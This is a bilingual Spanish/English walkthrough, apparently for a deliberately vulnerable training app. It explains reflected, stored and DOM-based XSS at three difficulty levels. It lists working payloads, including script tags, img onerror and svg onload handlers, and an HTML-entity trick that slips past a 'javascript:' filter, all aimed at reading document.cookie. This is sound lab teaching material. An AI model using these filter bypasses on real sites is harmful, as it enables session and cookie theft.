XSS Reflejado

  1. El parámetro q se refleja con |safe en Jinja2 — cualquier HTML/JS se ejecuta.
  2. Easy: <script>alert(document.cookie)</script> (la alerta mostrará la cookie xss_flag).
  3. Medium: Filtra <script> tags. Bypass con event handlers: 
    <img src=x onerror=alert(1)>
<svg onload=alert(document.cookie)>
  4. Hard: Reemplaza < y > por entidades HTML. XSS bloqueado — usa XSStrike para análisis avanzado.

XSS Almacenado

  1. Easy: Publica un comentario con: <script>alert('Stored XSS')</script>
  2. Medium: Filtra <script>. Bypass: <img src=x onerror=alert(1)> en el cuerpo del comentario.
  3. Hard: Reemplaza < y > — XSS bloqueada.

XSS DOM-based

  1. El JS de la página lee ?name= o #hash y lo inyecta con innerHTML. El servidor nunca ve el payload.
  2. Easy: Sin filtro. Nota: <script> no se ejecuta vía innerHTML. Usa event handlers: 
    /xss/dom?name=<img src=x onerror=alert(1)>
/xss/dom#<svg onload=alert(document.cookie)>
  3. Medium: JS filtra <script> tags. Mismos payloads que Easy funcionan: 
    /xss/dom?name=<img src=x onerror=alert(1)>
  4. Hard: JS filtra tags peligrosos + on*= handlers + javascript:. Bypass con HTML entities: 
    # El filtro busca "javascript:" literal pero &#106; = 'j'
/xss/dom?name=<a href="&#106;avascript:alert(document.cookie)">click me</a>

Reflected XSS

  1. The q parameter is reflected with |safe in Jinja2 — any HTML/JS executes.
  2. Easy: <script>alert(document.cookie)</script> (the alert will show the xss_flag cookie).
  3. Medium: Filters <script> tags. Bypass with event handlers: 
    <img src=x onerror=alert(1)>
<svg onload=alert(document.cookie)>
  4. Hard: Replaces < and > with HTML entities. XSS blocked — use XSStrike for advanced analysis.

Stored XSS

  1. Easy: Post: <script>alert('Stored XSS')</script>
  2. Medium: Filters <script>. Bypass: <img src=x onerror=alert(1)> in comment body.
  3. Hard: Replaces < and > — XSS blocked.

DOM-based XSS

  1. Page JS reads ?name= or #hash and injects via innerHTML. Server never sees the payload.
  2. Easy: No filter. Note: <script> doesn't execute via innerHTML. Use event handlers: 
    /xss/dom?name=<img src=x onerror=alert(1)>
/xss/dom#<svg onload=alert(document.cookie)>
  3. Medium: JS filters <script> tags. Same payloads as Easy work: 
    /xss/dom?name=<img src=x onerror=alert(1)>
  4. Hard: JS filters dangerous tags + on*= handlers + javascript:. Bypass with HTML entities: 
    # Filter looks for literal "javascript:" but &#106; = 'j'
/xss/dom?name=<a href="&#106;avascript:alert(document.cookie)">click me</a>
